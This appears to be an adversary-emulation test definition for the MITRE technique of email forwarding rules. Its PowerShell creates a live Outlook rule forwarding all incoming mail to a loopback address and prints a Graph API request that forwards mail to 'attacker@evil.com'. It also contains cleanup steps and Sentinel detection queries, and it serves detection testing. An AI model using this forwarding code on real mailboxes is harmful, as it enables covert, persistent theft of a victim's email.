@@ -1,0 +1,138 @@
+id: T1114.003_email_forwarding_rule
+name: "Email Collection — Email Forwarding Rule"
+mitre_technique: "T1114.003"
+mitre_tactic: "collection"
+description: >
+  Adversaries create inbox forwarding rules to automatically send copies of victim
+  emails to an adversary-controlled address. This provides persistent email surveillance
+  that survives password resets — the rule remains active until explicitly removed.
+  Rules can be created via Outlook client, Outlook Web Access, PowerShell Exchange
+  cmdlets, or Graph API. External forwarding is the most dangerous variant: every
+  email the victim receives is silently copied to the adversary. Detection requires
+  auditing new inbox rule creation and any rule containing forwarding actions.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1114/003/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1114.003 — Email Forwarding Rule simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a malicious Outlook inbox rule via COM automation"
+    command: |
+      Write-Host "[PAS] Outlook inbox rule creation simulation:"
+      $outlook = $null
+      try {
+          $outlook = New-Object -ComObject Outlook.Application -ErrorAction SilentlyContinue
+      } catch {}
+
+      if ($outlook) {
+          $ns    = $outlook.GetNamespace("MAPI")
+          $inbox = $ns.GetDefaultFolder(6)  # olFolderInbox = 6
+          $rules = $outlook.Session.DefaultStore.GetRules()
+
+          # Create a forwarding rule
+          $rule      = $rules.Create("PAS_T1114_003_ForwardRule", 0)  # olRuleReceive = 0
+          $fwdAction = $rule.Actions.Forward
+          $fwdAction.Enabled = $true
+          $recipient = $fwdAction.Recipients.Add("pas_exfil@127.0.0.1")
+          $recipient.Resolve()
+          $rule.Enabled = $true
+
+          $rules.Save()
+          Write-Host "[PAS] Inbox forwarding rule created: 'PAS_T1114_003_ForwardRule'"
+          Write-Host "[PAS] All incoming emails forwarded to: pas_exfil@127.0.0.1"
+          Write-Host "[PAS] OfficeActivity event: New-InboxRule should fire"
+
+          [System.Runtime.InteropServices.Marshal]::ReleaseComObject($outlook) | Out-Null
+      } else {
+          Write-Host "[PAS] Outlook not installed — simulating Graph API rule creation:"
+          Write-Host "[PAS] Real: POST /v1.0/me/mailFolders/inbox/messageRules"
+          Write-Host '[PAS] Body: {"displayName":"FwdRule","actions":{"forwardTo":[{"emailAddress":{"address":"attacker@evil.com"}}]}}'
+          try {
+              $req  = [System.Net.WebRequest]::Create("http://127.0.0.1/v1.0/me/mailFolders/inbox/messageRules")
+              $req.Method = "POST"
+              $req.Headers.Add("Authorization", "Bearer PAS_TOKEN")
+              $req.Timeout = 300
+              $req.GetResponse() | Out-Null
+          } catch {}
+          Write-Host "[PAS] Graph API POST to /messageRules loopback generated"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Enumerate existing inbox rules — check for malicious forwarding"
+    command: |
+      Write-Host "[PAS] Existing Outlook inbox rules:"
+      $outlook = $null
+      try { $outlook = New-Object -ComObject Outlook.Application -ErrorAction SilentlyContinue } catch {}
+
+      if ($outlook) {
+          $rules = $outlook.Session.DefaultStore.GetRules()
+          for ($i = 1; $i -le $rules.Count; $i++) {
+              $rule = $rules.Item($i)
+              Write-Host "  Rule: '$($rule.Name)' Enabled=$($rule.Enabled)"
+              if ($rule.Actions.Forward.Enabled) {
+                  $rcpts = $rule.Actions.Forward.Recipients
+                  Write-Host "  [SUSPICIOUS] Forwarding to $($rcpts.Count) recipient(s)"
+              }
+          }
+          [System.Runtime.InteropServices.Marshal]::ReleaseComObject($outlook) | Out-Null
+      } else {
+          Write-Host "[PAS] Outlook not running — check Exchange/M365 for rules"
+      }
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check Sentinel — OfficeActivity New-InboxRule with ForwardTo parameter, Set-Mailbox ForwardingSmtpAddress"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove the forwarding inbox rule"
+    command: |
+      $outlook = $null
+      try { $outlook = New-Object -ComObject Outlook.Application -ErrorAction SilentlyContinue } catch {}
+
+      if ($outlook) {
+          $rules = $outlook.Session.DefaultStore.GetRules()
+          $toRemove = @()
+          for ($i = 1; $i -le $rules.Count; $i++) {
+              if ($rules.Item($i).Name -eq "PAS_T1114_003_ForwardRule") {
+                  $toRemove += $rules.Item($i)
+              }
+          }
+          foreach ($r in $toRemove) {
+              $rules.Remove($r.Name)
+              Write-Host "[PAS][Cleanup] Removed rule: $($r.Name)"
+          }
+          if ($toRemove.Count -gt 0) { $rules.Save() }
+          [System.Runtime.InteropServices.Marshal]::ReleaseComObject($outlook) | Out-Null
+      }
+      Write-Host "[PAS][Cleanup] Forwarding rule cleanup complete"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1114.003 cleanup complete"
+
+analyst_checklist:
+  - "Sentinel: OfficeActivity | where Operation == 'New-InboxRule' and Parameters contains 'ForwardTo'"
+  - "Sentinel: OfficeActivity | where Operation == 'Set-Mailbox' and Parameters contains 'ForwardingSmtpAddress'"
+  - "Sentinel: OfficeActivity | where Operation == 'New-InboxRule' and Parameters contains 'RedirectTo'"
+  - "MDE/Defender for Cloud Apps: alert on 'Email forwarding to external domain configured'"
+  - "CONTROL CHECK: Disable external email forwarding at tenant level — Set-RemoteDomain Default -AutoForwardEnabled $false"
+  - "CONTROL CHECK: Run quarterly: Get-Mailbox | Where {$_.ForwardingSmtpAddress} to catch mailbox-level forwarding"
+  - "CONTROL CHECK: Transport rule to block external auto-forward as a belt-and-suspenders control"
